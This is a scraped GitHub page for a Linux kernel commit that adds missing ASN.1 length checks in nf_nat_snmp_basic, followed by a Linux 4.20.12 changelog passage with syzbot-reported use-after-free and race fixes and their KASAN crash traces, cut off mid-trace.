=== Content from github.com_cc7b57a8_20250120_234516.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2Fc4c07b4d6fa1f11880eab8e076d3d060ef3f55fc)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2Fc4c07b4d6fa1f11880eab8e076d3d060ef3f55fc)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=torvalds%2Flinux)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[torvalds](/torvalds)
/
**[linux](/torvalds/linux)**
Public

* [Notifications](/login?return_to=%2Ftorvalds%2Flinux) You must be signed in to change notification settings
* [Fork
  54.8k](/login?return_to=%2Ftorvalds%2Flinux)
* [Star
   186k](/login?return_to=%2Ftorvalds%2Flinux)

* [Code](/torvalds/linux)
* [Pull requests
  436](/torvalds/linux/pulls)
* [Actions](/torvalds/linux/actions)
* [Projects
  0](/torvalds/linux/projects)
* [Security](/torvalds/linux/security)
* [Insights](/torvalds/linux/pulse)

Additional navigation options

* [Code](/torvalds/linux)
* [Pull requests](/torvalds/linux/pulls)
* [Actions](/torvalds/linux/actions)
* [Projects](/torvalds/linux/projects)
* [Security](/torvalds/linux/security)
* [Insights](/torvalds/linux/pulse)

## Commit

[Permalink](/torvalds/linux/commit/c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

netfilter: nf\_nat\_snmp\_basic: add missing length checks in ASN.1 cbs

[Browse files](/torvalds/linux/tree/c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc)
Browse the repository at this point in the history

```
The generic ASN.1 decoder infrastructure doesn't guarantee that callbacks
will get as much data as they expect; callbacks have to check the `datalen`
parameter before looking at `data`. Make sure that snmp_version() and
snmp_helper() don't read/write beyond the end of the packet data.

(Also move the assignment to `pdata` down below the check to make it clear
that it isn't necessarily a pointer we can use before the `datalen` check.)

Fixes: [cc2d586](https://github.com/torvalds/linux/commit/cc2d58634e0f489d28b5564c05abc69930b4d920) ("netfilter: nf_nat_snmp_basic: use asn1 decoder library")
Signed-off-by: Jann Horn <jannh@google.com>
Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>
```

* Loading branch information

[![@thejh](https://avatars.githubusercontent.com/u/499370?s=40&v=4)](/thejh) [![@ummakynes](https://avatars.githubusercontent.com/u/46745220?s=40&v=4)](/ummakynes)

[thejh](/torvalds/linux/commits?author=thejh "View all commits by thejh")
authored and
[ummakynes](/torvalds/linux/commits?author=ummakynes "View all commits by ummakynes")
committed
Feb 11, 2019

1 parent
[31b58ad](/torvalds/linux/commit/31b58ad0c3279817cd246eab27eaf53b626dfcde)

commit c4c07b4

Showing
**1 changed file**
with
**6 additions**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

7 changes: 6 additions & 1 deletion

7
[net/ipv4/netfilter/nf\_nat\_snmp\_basic\_main.c](#diff-d709d6a76e9429f84cbd47df2b8bd78c8b12c7fcce1dd91d58f7422f51c6cc7c "net/ipv4/netfilter/nf_nat_snmp_basic_main.c")

Show comments

[View file](/torvalds/linux/blob/c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc/net/ipv4/netfilter/nf_nat_snmp_basic_main.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -105,6 +105,8 @@ static void fast\_csum(struct snmp\_ctx \*ctx, unsigned char offset) |
|  |  | int snmp\_version(void \*context, size\_t hdrlen, unsigned char tag, |
|  |  | const void \*data, size\_t datalen) |
|  |  | { |
|  |  | if (datalen != 1) |
|  |  | return -EINVAL; |
|  |  | if (\*(unsigned char \*)data > 1) |
|  |  | return -ENOTSUPP; |
|  |  | return 1; |
| Expand All | | @@ -114,8 +116,11 @@ int snmp\_helper(void \*context, size\_t hdrlen, unsigned char tag, |
|  |  | const void \*data, size\_t datalen) |
|  |  | { |
|  |  | struct snmp\_ctx \*ctx = (struct snmp\_ctx \*)context; |
|  |  | \_\_be32 \*pdata = (\_\_be32 \*)data; |
|  |  | \_\_be32 \*pdata; |
|  |  |  |
|  |  | if (datalen != 4) |
|  |  | return -EINVAL; |
|  |  | pdata = (\_\_be32 \*)data; |
|  |  | if (\*pdata == ctx->from) { |
|  |  | pr\_debug("%s: %pI4 to %pI4\n", \_\_func\_\_, |
|  |  | (void \*)&ctx->from, (void \*)&ctx->to); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `c4c07b4`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2Fc4c07b4d6fa1f11880eab8e076d3d060ef3f55fc) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from cdn.kernel.org_47be951a_20250120_234515.html ===
commit c91951f15978f1a0c6b65f063d30f7ea7bc6fb42
Author: Greg Kroah-Hartman
Date: Sat Feb 23 09:08:07 2019 +0100
Linux 4.20.12
commit 578636114de457240a817063ebb6b4b07527a680
Author: Eric Dumazet
Date: Tue Jan 22 10:40:59 2019 -0800
ax25: fix possible use-after-free
commit 63530aba7826a0f8e129874df9c4d264f9db3f9e upstream.
syzbot found that ax25 routes where not properly protected
against concurrent use [1].
In this particular report the bug happened while
copying ax25->digipeat.
Fix this problem by making sure we call ax25\_get\_route()
while ax25\_route\_lock is held, so that no modification
could happen while using the route.
The current two ax25\_get\_route() callers do not sleep,
so this change should be fine.
Once we do that, ax25\_get\_route() no longer needs to
grab a reference on the found route.
[1]
ax25\_connect(): syz-executor0 uses autobind, please contact jreuter@yaina.de
BUG: KASAN: use-after-free in memcpy include/linux/string.h:352 [inline]
BUG: KASAN: use-after-free in kmemdup+0x42/0x60 mm/util.c:113
Read of size 66 at addr ffff888066641a80 by task syz-executor2/531
ax25\_connect(): syz-executor0 uses autobind, please contact jreuter@yaina.de
CPU: 1 PID: 531 Comm: syz-executor2 Not tainted 5.0.0-rc2+ #10
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 01/01/2011
Call Trace:
\_\_dump\_stack lib/dump\_stack.c:77 [inline]
dump\_stack+0x1db/0x2d0 lib/dump\_stack.c:113
print\_address\_description.cold+0x7c/0x20d mm/kasan/report.c:187
kasan\_report.cold+0x1b/0x40 mm/kasan/report.c:317
check\_memory\_region\_inline mm/kasan/generic.c:185 [inline]
check\_memory\_region+0x123/0x190 mm/kasan/generic.c:191
memcpy+0x24/0x50 mm/kasan/common.c:130
memcpy include/linux/string.h:352 [inline]
kmemdup+0x42/0x60 mm/util.c:113
kmemdup include/linux/string.h:425 [inline]
ax25\_rt\_autobind+0x25d/0x750 net/ax25/ax25\_route.c:424
ax25\_connect.cold+0x30/0xa4 net/ax25/af\_ax25.c:1224
\_\_sys\_connect+0x357/0x490 net/socket.c:1664
\_\_do\_sys\_connect net/socket.c:1675 [inline]
\_\_se\_sys\_connect net/socket.c:1672 [inline]
\_\_x64\_sys\_connect+0x73/0xb0 net/socket.c:1672
do\_syscall\_64+0x1a3/0x800 arch/x86/entry/common.c:290
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
RIP: 0033:0x458099
Code: 6d b7 fb ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 0f 83 3b b7 fb ff c3 66 2e 0f 1f 84 00 00 00 00
RSP: 002b:00007f870ee22c78 EFLAGS: 00000246 ORIG\_RAX: 000000000000002a
RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 0000000000458099
RDX: 0000000000000048 RSI: 0000000020000080 RDI: 0000000000000005
RBP: 000000000073bf00 R08: 0000000000000000 R09: 0000000000000000
ax25\_connect(): syz-executor4 uses autobind, please contact jreuter@yaina.de
R10: 0000000000000000 R11: 0000000000000246 R12: 00007f870ee236d4
R13: 00000000004be48e R14: 00000000004ce9a8 R15: 00000000ffffffff
Allocated by task 526:
save\_stack+0x45/0xd0 mm/kasan/common.c:73
set\_track mm/kasan/common.c:85 [inline]
\_\_kasan\_kmalloc mm/kasan/common.c:496 [inline]
\_\_kasan\_kmalloc.constprop.0+0xcf/0xe0 mm/kasan/common.c:469
kasan\_kmalloc+0x9/0x10 mm/kasan/common.c:504
ax25\_connect(): syz-executor5 uses autobind, please contact jreuter@yaina.de
kmem\_cache\_alloc\_trace+0x151/0x760 mm/slab.c:3609
kmalloc include/linux/slab.h:545 [inline]
ax25\_rt\_add net/ax25/ax25\_route.c:95 [inline]
ax25\_rt\_ioctl+0x3b9/0x1270 net/ax25/ax25\_route.c:233
ax25\_ioctl+0x322/0x10b0 net/ax25/af\_ax25.c:1763
sock\_do\_ioctl+0xe2/0x400 net/socket.c:950
sock\_ioctl+0x32f/0x6c0 net/socket.c:1074
vfs\_ioctl fs/ioctl.c:46 [inline]
file\_ioctl fs/ioctl.c:509 [inline]
do\_vfs\_ioctl+0x107b/0x17d0 fs/ioctl.c:696
ksys\_ioctl+0xab/0xd0 fs/ioctl.c:713
\_\_do\_sys\_ioctl fs/ioctl.c:720 [inline]
\_\_se\_sys\_ioctl fs/ioctl.c:718 [inline]
\_\_x64\_sys\_ioctl+0x73/0xb0 fs/ioctl.c:718
do\_syscall\_64+0x1a3/0x800 arch/x86/entry/common.c:290
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
ax25\_connect(): syz-executor5 uses autobind, please contact jreuter@yaina.de
Freed by task 550:
save\_stack+0x45/0xd0 mm/kasan/common.c:73
set\_track mm/kasan/common.c:85 [inline]
\_\_kasan\_slab\_free+0x102/0x150 mm/kasan/common.c:458
kasan\_slab\_free+0xe/0x10 mm/kasan/common.c:466
\_\_cache\_free mm/slab.c:3487 [inline]
kfree+0xcf/0x230 mm/slab.c:3806
ax25\_rt\_add net/ax25/ax25\_route.c:92 [inline]
ax25\_rt\_ioctl+0x304/0x1270 net/ax25/ax25\_route.c:233
ax25\_ioctl+0x322/0x10b0 net/ax25/af\_ax25.c:1763
sock\_do\_ioctl+0xe2/0x400 net/socket.c:950
sock\_ioctl+0x32f/0x6c0 net/socket.c:1074
vfs\_ioctl fs/ioctl.c:46 [inline]
file\_ioctl fs/ioctl.c:509 [inline]
do\_vfs\_ioctl+0x107b/0x17d0 fs/ioctl.c:696
ksys\_ioctl+0xab/0xd0 fs/ioctl.c:713
\_\_do\_sys\_ioctl fs/ioctl.c:720 [inline]
\_\_se\_sys\_ioctl fs/ioctl.c:718 [inline]
\_\_x64\_sys\_ioctl+0x73/0xb0 fs/ioctl.c:718
do\_syscall\_64+0x1a3/0x800 arch/x86/entry/common.c:290
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
The buggy address belongs to the object at ffff888066641a80
which belongs to the cache kmalloc-96 of size 96
The buggy address is located 0 bytes inside of
96-byte region [ffff888066641a80, ffff888066641ae0)
The buggy address belongs to the page:
page:ffffea0001999040 count:1 mapcount:0 mapping:ffff88812c3f04c0 index:0x0
flags: 0x1fffc0000000200(slab)
ax25\_connect(): syz-executor4 uses autobind, please contact jreuter@yaina.de
raw: 01fffc0000000200 ffffea0001817948 ffffea0002341dc8 ffff88812c3f04c0
raw: 0000000000000000 ffff888066641000 0000000100000020 0000000000000000
page dumped because: kasan: bad access detected
Memory state around the buggy address:
ffff888066641980: fb fb fb fb fb fb fb fb fb fb fb fb fc fc fc fc
ffff888066641a00: 00 00 00 00 00 00 00 00 02 fc fc fc fc fc fc fc
>ffff888066641a80: fb fb fb fb fb fb fb fb fb fb fb fb fc fc fc fc
^
ffff888066641b00: fb fb fb fb fb fb fb fb fb fb fb fb fc fc fc fc
ffff888066641b80: 00 00 00 00 00 00 00 00 00 00 00 00 fc fc fc fc
Signed-off-by: Eric Dumazet
Cc: Ralf Baechle
Reported-by: syzbot
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit f3876e6070bfcdb2d0a2972758d51ae202bc8ad4
Author: Eric Dumazet
Date: Tue Feb 5 15:38:44 2019 -0800
mISDN: fix a race in dev\_expire\_timer()
commit bdcc5bc25548ef6b08e2e43937148f907c212292 upstream.
Since mISDN\_close() uses dev->pending to iterate over active
timers, there is a chance that one timer got removed from the
->pending list in dev\_expire\_timer() but that the thread
has not called yet wake\_up\_interruptible()
So mISDN\_close() could miss this and free dev before
completion of at least one dev\_expire\_timer()
syzbot was able to catch this race :
BUG: KASAN: use-after-free in register\_lock\_class+0x140c/0x1bf0 kernel/locking/lockdep.c:827
Write of size 8 at addr ffff88809fc18948 by task syz-executor1/24769
CPU: 1 PID: 24769 Comm: syz-executor1 Not tainted 5.0.0-rc5 #60
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 01/01/2011
Call Trace:
\_\_dump\_stack lib/dump\_stack.c:77 [inline]
dump\_stack+0x172/0x1f0 lib/dump\_stack.c:113
print\_address\_description.cold+0x7c/0x20d mm/kasan/report.c:187
kasan\_report.cold+0x1b/0x40 mm/kasan/report.c:317
\_\_asan\_report\_store8\_noabort+0x17/0x20 mm/kasan/generic\_report.c:140
register\_lock\_class+0x140c/0x1bf0 kernel/locking/lockdep.c:827
\_\_lock\_acquire+0x11f/0x4700 kernel/locking/lockdep.c:3224
lock\_acquire+0x16f/0x3f0 kernel/locking/lockdep.c:3841
\_\_raw\_spin\_lock\_irqsave include/linux/spinlock\_api\_smp.h:110 [inline]
\_raw\_spin\_lock\_irqsave+0x95/0xcd kernel/locking/spinlock.c:152
\_\_wake\_up\_common\_lock+0xc7/0x190 kernel/sched/wait.c:120
\_\_wake\_up+0xe/0x10 kernel/sched/wait.c:145
dev\_expire\_timer+0xe4/0x3b0 drivers/isdn/mISDN/timerdev.c:174
call\_timer\_fn+0x190/0x720 kernel/time/timer.c:1325
protocol 88fb is buggy, dev hsr\_slave\_0
protocol 88fb is buggy, dev hsr\_slave\_1
expire\_timers kernel/time/timer.c:1362 [inline]
\_\_run\_timers kernel/time/timer.c:1681 [inline]
\_\_run\_timers kernel/time/timer.c:1649 [inline]
run\_timer\_softirq+0x652/0x1700 kernel/time/timer.c:1694
\_\_do\_softirq+0x266/0x95a kernel/softirq.c:292
invoke\_softirq kernel/softirq.c:373 [inline]
irq\_exit+0x180/0x1d0 kernel/softirq.c:413
exiting\_irq arch/x86/include/asm/apic.h:536 [inline]
smp\_apic\_timer\_interrupt+0x14a/0x570 arch/x86/kernel/apic/apic.c:1062
apic\_timer\_interrupt+0xf/0x20 arch/x86/entry/entry\_64.S:807

RIP: 0010:\_\_sanitizer\_cov\_trace\_pc+0x26/0x50 kernel/kcov.c:101
Code: 90 90 90 90 55 48 89 e5 48 8b 75 08 65 48 8b 04 25 40 ee 01 00 65 8b 15 98 12 92 7e 81 e2 00 01 1f 00 75 2b 8b 90 d8 12 00 00 <83> fa 02 75 20 48 8b 88 e0 12 00 00 8b 80 dc 12 00 00 48 8b 11 48
RSP: 0018:ffff8880589b7a60 EFLAGS: 00000246 ORIG\_RAX: ffffffffffffff13
RAX: ffff888087ce25c0 RBX: 0000000000000001 RCX: ffffffff818f8ca3
RDX: 0000000000000000 RSI: ffffffff818f8b48 RDI: 0000000000000001
RBP: ffff8880589b7a60 R08: ffff888087ce25c0 R09: ffffed1015d25bd0
R10: ffffed1015d25bcf R11: ffff8880ae92de7b R12: ffffea0001ae4680
R13: ffffea0001ae4688 R14: 0000000000000000 R15: ffffea0001b41648
PageIdle include/linux/page-flags.h:398 [inline]
page\_is\_idle include/linux/page\_idle.h:29 [inline]
mark\_page\_accessed+0x618/0x1140 mm/swap.c:398
touch\_buffer fs/buffer.c:59 [inline]
\_\_find\_get\_block+0x312/0xcc0 fs/buffer.c:1298
sb\_find\_get\_block include/linux/buffer\_head.h:338 [inline]
recently\_deleted fs/ext4/ialloc.c:682 [inline]
find\_inode\_bit.isra.0+0x202/0x510 fs/ext4/ialloc.c:722
\_\_ext4\_new\_inode+0x14ad/0x52c0 fs/ext4/ialloc.c:914
ext4\_symlink+0x3f8/0xbe0 fs/ext4/namei.c:3096
vfs\_symlink fs/namei.c:4126 [inline]
vfs\_symlink+0x378/0x5d0 fs/namei.c:4112
do\_symlinkat+0x22b/0x290 fs/namei.c:4153
\_\_do\_sys\_symlink fs/namei.c:4172 [inline]
\_\_se\_sys\_symlink fs/namei.c:4170 [inline]
\_\_x64\_sys\_symlink+0x59/0x80 fs/namei.c:4170
do\_syscall\_64+0x103/0x610 arch/x86/entry/common.c:290
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
RIP: 0033:0x457b67
Code: 0f 1f 00 b8 5c 00 00 00 0f 05 48 3d 01 f0 ff ff 0f 83 6d bb fb ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 b8 58 00 00 00 0f 05 <48> 3d 01 f0 ff ff 0f 83 4d bb fb ff c3 66 2e 0f 1f 84 00 00 00 00
RSP: 002b:00007fff045ce0f8 EFLAGS: 00000202 ORIG\_RAX: 0000000000000058
RAX: ffffffffffffffda RBX: 0000000000000001 RCX: 0000000000457b67
RDX: 00007fff045ce173 RSI: 00000000004bd63f RDI: 00007fff045ce160
RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000013
R10: 0000000000000075 R11: 0000000000000202 R12: 0000000000000000
R13: 0000000000000001 R14: 000000000000029b R15: 0000000000000001
Allocated by task 24763:
save\_stack+0x45/0xd0 mm/kasan/common.c:73
set\_track mm/kasan/common.c:85 [inline]
\_\_kasan\_kmalloc mm/kasan/common.c:496 [inline]
\_\_kasan\_kmalloc.constprop.0+0xcf/0xe0 mm/kasan/common.c:469
kasan\_kmalloc+0x9/0x10 mm/kasan/common.c:504
kmem\_cache\_alloc\_trace+0x151/0x760 mm/slab.c:3609
kmalloc include/linux/slab.h:545 [inline]
mISDN\_open+0x9a/0x270 drivers/isdn/mISDN/timerdev.c:59
misc\_open+0x398/0x4c0 drivers/char/misc.c:141
chrdev\_open+0x247/0x6b0 fs/char\_dev.c:417
do\_dentry\_open+0x47d/0x1130 fs/open.c:771
vfs\_open+0xa0/0xd0 fs/open.c:880
do\_last fs/namei.c:3418 [inline]
path\_openat+0x10d7/0x4690 fs/namei.c:3534
do\_filp\_open+0x1a1/0x280 fs/namei.c:3564
do\_sys\_open+0x3fe/0x5d0 fs/open.c:1063
\_\_do\_sys\_openat fs/open.c:1090 [inline]
\_\_se\_sys\_openat fs/open.c:1084 [inline]
\_\_x64\_sys\_openat+0x9d/0x100 fs/open.c:1084
do\_syscall\_64+0x103/0x610 arch/x86/entry/common.c:290
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
Freed by task 24762:
save\_stack+0x45/0xd0 mm/kasan/common.c:73
set\_track mm/kasan/common.c:85 [inline]
\_\_kasan\_slab\_free+0x102/0x150 mm/kasan/common.c:458
kasan\_slab\_free+0xe/0x10 mm/kasan/common.c:466
\_\_cache\_free mm/slab.c:3487 [inline]
kfree+0xcf/0x230 mm/slab.c:3806
mISDN\_close+0x2a1/0x390 drivers/isdn/mISDN/timerdev.c:97
\_\_fput+0x2df/0x8d0 fs/file\_table.c:278
\_\_\_\_fput+0x16/0x20 fs/file\_table.c:309
task\_work\_run+0x14a/0x1c0 kernel/task\_work.c:113
tracehook\_notify\_resume include/linux/tracehook.h:188 [inline]
exit\_to\_usermode\_loop+0x273/0x2c0 arch/x86/entry/common.c:166
prepare\_exit\_to\_usermode arch/x86/entry/common.c:197 [inline]
syscall\_return\_slowpath arch/x86/entry/common.c:268 [inline]
do\_syscall\_64+0x52d/0x610 arch/x86/entry/common.c:293
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
The buggy address belongs to the object at ffff88809fc18900
which belongs to the cache kmalloc-192 of size 192
The buggy address is located 72 bytes inside of
192-byte region [ffff88809fc18900, ffff88809fc189c0)
The buggy address belongs to the page:
page:ffffea00027f0600 count:1 mapcount:0 mapping:ffff88812c3f0040 index:0xffff88809fc18000
flags: 0x1fffc0000000200(slab)
raw: 01fffc0000000200 ffffea000269f648 ffffea00029f7408 ffff88812c3f0040
raw: ffff88809fc18000 ffff88809fc18000 000000010000000b 0000000000000000
page dumped because: kasan: bad access detected
Memory state around the buggy address:
ffff88809fc18800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
ffff88809fc18880: 00 fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
>ffff88809fc18900: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
^
ffff88809fc18980: fb fb fb fb fb fb fb fb fc fc fc fc fc fc fc fc
ffff88809fc18a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Signed-off-by: Eric Dumazet
Cc: Karsten Keil
Reported-by: syzbot
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit c1339bd49e72725e0a20f0b77980136e89c76e49
Author: Eric Dumazet
Date: Fri Feb 8 12:41:05 2019 -0800
net/x25: do not hold the cpu too long in x25\_new\_lci()
commit cf657d22ee1f0e887326a92169f2e28dc932fd10 upstream.
Due to quadratic behavior of x25\_new\_lci(), syzbot was able
to trigger an rcu stall.
Fix this by not blocking BH for the whole duration of
the function, and inserting a reschedule point when possible.
If we care enough, using a bitmap could get rid of the quadratic
behavior.
syzbot report :
rcu: INFO: rcu\_preempt self-detected stall on CPU
rcu: 0-...!: (10500 ticks this GP) idle=4fa/1/0x4000000000000002 softirq=283376/283376 fqs=0
rcu: (t=10501 jiffies g=383105 q=136)
rcu: rcu\_preempt kthread starved for 10502 jiffies! g383105 f0x0 RCU\_GP\_WAIT\_FQS(5) ->state=0x402 ->cpu=0
rcu: RCU grace-period kthread stack dump:
rcu\_preempt I28928 10 2 0x80000000
Call Trace:
context\_switch kernel/sched/core.c:2844 [inline]
\_\_schedule+0x817/0x1cc0 kernel/sched/core.c:3485
schedule+0x92/0x180 kernel/sched/core.c:3529
schedule\_timeout+0x4db/0xfd0 kernel/time/timer.c:1803
rcu\_gp\_fqs\_loop kernel/rcu/tree.c:1948 [inline]
rcu\_gp\_kthread+0x956/0x17a0 kernel/rcu/tree.c:2105
kthread+0x357/0x430 kernel/kthread.c:246
ret\_from\_fork+0x3a/0x50 arch/x86/entry/entry\_64.S:352
NMI backtrace for cpu 0
CPU: 0 PID: 8759 Comm: syz-executor2 Not tainted 5.0.0-rc4+ #51
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 01/01/2011
Call Trace:
\_\_dump\_stack lib/dump\_stack.c:77 [inline]
dump\_stack+0x172/0x1f0 lib/dump\_stack.c:113
nmi\_cpu\_backtrace.cold+0x63/0xa4 lib/nmi\_backtrace.c:101
nmi\_trigger\_cpumask\_backtrace+0x1be/0x236 lib/nmi\_backtrace.c:62
arch\_trigger\_cpumask\_backtrace+0x14/0x20 arch/x86/kernel/apic/hw\_nmi.c:38
trigger\_single\_cpu\_backtrace include/linux/nmi.h:164 [inline]
rcu\_dump\_cpu\_stacks+0x183/0x1cf kernel/rcu/tree.c:1211
print\_cpu\_stall kernel/rcu/tree.c:1348 [inline]
check\_cpu\_stall kernel/rcu/tree.c:1422 [inline]
rcu\_pending kernel/rcu/tree.c:3018 [inline]
rcu\_check\_callbacks.cold+0x500/0xa4a kernel/rcu/tree.c:2521
update\_process\_times+0x32/0x80 kernel/time/timer.c:1635
tick\_sched\_handle+0xa2/0x190 kernel/time/tick-sched.c:161
tick\_sched\_timer+0x47/0x130 kernel/time/tick-sched.c:1271
\_\_run\_hrtimer kernel/time/hrtimer.c:1389 [inline]
\_\_hrtimer\_run\_queues+0x33e/0xde0 kernel/time/hrtimer.c:1451
hrtimer\_interrupt+0x314/0x770 kernel/time/hrtimer.c:1509
local\_apic\_timer\_interrupt arch/x86/kernel/apic/apic.c:1035 [inline]
smp\_apic\_timer\_interrupt+0x120/0x570 arch/x86/kernel/apic/apic.c:1060
apic\_timer\_interrupt+0xf/0x20 arch/x86/entry/entry\_64.S:807

RIP: 0010:\_\_read\_once\_size include/linux/compiler.h:193 [inline]
RIP: 0010:queued\_write\_lock\_slowpath+0x13e/0x290 kernel/locking/qrwlock.c:86
Code: 00 00 fc ff df 4c 8d 2c 01 41 83 c7 03 41 0f b6 45 00 41 38 c7 7c 08 84 c0 0f 85 0c 01 00 00 8b 03 3d 00 01 00 00 74 1a f3 90 <41> 0f b6 55 00 41 38 d7 7c eb 84 d2 74 e7 48 89 df e8 6c 0f 4f 00
RSP: 0018:ffff88805f117bd8 EFLAGS: 00000206 ORIG\_RAX: ffffffffffffff13
RAX: 0000000000000300 RBX: ffffffff89413ba0 RCX: 1ffffffff1282774
RDX: 0000000000000000 RSI: 0000000000000004 RDI: ffffffff89413ba0
RBP: ffff88805f117c70 R08: 1ffffffff1282774 R09: fffffbfff1282775
R10: fffffbfff1282774 R11: ffffffff89413ba3 R12: 00000000000000ff
R13: fffffbfff1282774 R14: 1ffff1100be22f7d R15: 0000000000000003
queued\_write\_lock include/asm-generic/qrwlock.h:104 [inline]
do\_raw\_write\_lock+0x1d6/0x290 kernel/locking/spinlock\_debug.c:203
\_\_raw\_write\_lock\_bh include/linux/rwlock\_api\_smp.h:204 [inline]
\_raw\_write\_lock\_bh+0x3b/0x50 kernel/locking/spinlock.c:312
x25\_insert\_socket+0x21/0xe0 net/x25/af\_x25.c:267
x25\_bind+0x273/0x340 net/x25/af\_x25.c:705
\_\_sys\_bind+0x23f/0x290 net/socket.c:1505
\_\_do\_sys\_bind net/socket.c:1516 [inline]
\_\_se\_sys\_bind net/socket.c:1514 [inline]
\_\_x64\_sys\_bind+0x73/0xb0 net/socket.c:1514
do\_syscall\_64+0x103/0x610 arch/x86/entry/common.c:290
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
RIP: 0033:0x457e39
